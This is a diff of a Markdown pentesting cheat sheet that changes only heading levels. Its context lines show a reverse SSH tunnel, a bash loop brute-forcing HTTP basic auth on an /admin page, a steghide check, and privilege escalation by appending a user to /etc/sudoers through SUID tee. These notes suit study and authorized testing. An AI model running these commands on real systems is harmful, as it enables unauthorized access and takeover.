@@ -167,7 +167,7 @@ Execute the following in the remote machine.
 ssh -R 3000:127.0.0.1:3000 <your-user>@<your-ip> -N -f
 ```
 
-# PENETRATION TESTING STEPS
+## PENETRATION TESTING STEPS
 1 . Make a ping and try to detect the OS of the machine
 ```ssh
 ping -c 10 <ip>
@@ -205,7 +205,7 @@ function ctrl_c(){
 
 trap ctrl_c INT
 
-# Hide a cursor
+## Hide a cursor
 tput civis
 
 for password in $(cat diccionario.txt); do
@@ -223,11 +223,11 @@ done; tput cnorm;
 curl -X GET -s http://<ip>/admin --user user:password
 ```
 
-# Testing estenografia 
+## Steganography 
 ```
 steghide info <picture.jpg>
 ```
-# Add a user to sudoers to scale privileges thanks of having "tee" command with suid
+## Add a user to sudoers to scale privileges thanks of having "tee" command with suid
 ```sudo
 echo "<user> ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
 ```
